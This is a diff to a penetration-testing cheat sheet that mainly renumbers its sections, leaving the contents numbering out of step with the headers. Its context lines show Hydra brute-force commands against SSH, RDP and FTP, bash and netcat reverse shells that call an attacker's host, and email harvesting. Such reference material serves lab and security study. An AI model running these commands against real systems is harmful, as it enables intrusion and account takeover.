@@ -20,18 +20,19 @@
 - [6. Mysql](#mysql)
 - [7. Cewl](#cewl) - It is use to create a worldlist using website link
 - [8. SSH](#ssh)
-- [8. Hydra](#hydra) - Brute force attack on ssh
-- [9.FTP](#ftp)
-- [10. shell upgreade](#shell)
-- [10. Password Cracking](/hash_cracking.md)
-- [11. RDP-3389](#rdp)
-- [12. SMB](/smb.md)
-- [13. Metasploit](/metasploit.md)
-- [14. netcat](#nc)
-- [15. Reverse_Shell_Script](#rev)
-- [16. Privilege escalation](/Privilege.md)
-- [17. Email Harversting with theHarvester](#email)
-- [18. Simple Local Web Servers](#localweb)
+- [9. Hydra](#hydra) - Brute force attack on ssh
+- [10.FTP](#ftp)
+- [11. shell upgreade](#shell)
+- [12. Post-Exploit Enumeration](#post)
+- [13. Password Cracking](/hash_cracking.md)
+- [14. RDP-3389](#rdp)
+- [15. SMB](/smb.md)
+- [16. Metasploit](/metasploit.md)
+- [17. netcat](#nc)
+- [18. Reverse_Shell_Script](#rev)
+- [19. Privilege escalation](/Privilege.md)
+- [20. Email Harversting with theHarvester](#email)
+- [21. Simple Local Web Servers](#localweb)
 
 # Windows
 - [I. certutil](#certutil)
@@ -141,7 +142,7 @@ Downloading a file from a remote system.
 
 
 
-# 8. Hydra <a name="hydra"></a>
+# 9. Hydra <a name="hydra"></a>
 - `hydra -C <combinations.txt> <ip> <service>`
 - ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
 - ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
@@ -178,7 +179,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 
-# 9. FTP <a name="ftp"></a>
+# 10. FTP <a name="ftp"></a>
 
 - `ftp  192.168.112.50 21`
 ```
@@ -196,7 +197,7 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
-# 10. shell upgrade <a name="shell"></a>
+# 11. shell upgrade <a name="shell"></a>
 - `export TERM=linux` or `export TERM=xterm`
 - __`python -c 'import pty; pty.spawn("/bin/bash")'`__
 
@@ -211,14 +212,14 @@ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 ```
 - __`nc -lnvp 31337`__
 
-# 10. [Password Cracking](/hash_cracking.md)
+# 12. [Password Cracking](/hash_cracking.md)
 
 
 
 
 
 
-# 11. RDP-3389 <a name="rdp"></a>
+# 13. RDP-3389 <a name="rdp"></a>
 
 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
 
@@ -239,11 +240,11 @@ exploit
 - __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
 
 
-# [12. SMB](/smb.md)
+# [14. SMB](/smb.md)
 
 
 
-# [13. Metasploit](/metasploit.md)
+# [15. Metasploit](/metasploit.md)
 
 
 
@@ -279,7 +280,7 @@ __Download the reverse shell in windows__
     - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
 
 
-# 15. Reverse_Shell_Script <a name="rev"></a> ---> (nc -lvnp 9001)
+# 16. Reverse_Shell_Script <a name="rev"></a> ---> (nc -lvnp 9001)
 - [revshells.com](https://revshells.com)
 - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__
 - __Sometimes you need to encode__
@@ -295,18 +296,18 @@ __Download the reverse shell in windows__
 
 
 
-# [16. Privilege escalation](/Privilege.md)
+# [17. Privilege escalation](/Privilege.md)
 
 
 
-# 17. Email Harversting with theHarvester <a name="email"></a>
+# 18. Email Harversting with theHarvester <a name="email"></a>
 - __`theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns`__
 
 
 
 
 
-# 18. Simple Local Web Servers <a name="localweb"></a>
+# 19. Simple Local Web Servers <a name="localweb"></a>
 
 ```
 python -m SimpleHTTPServer 80
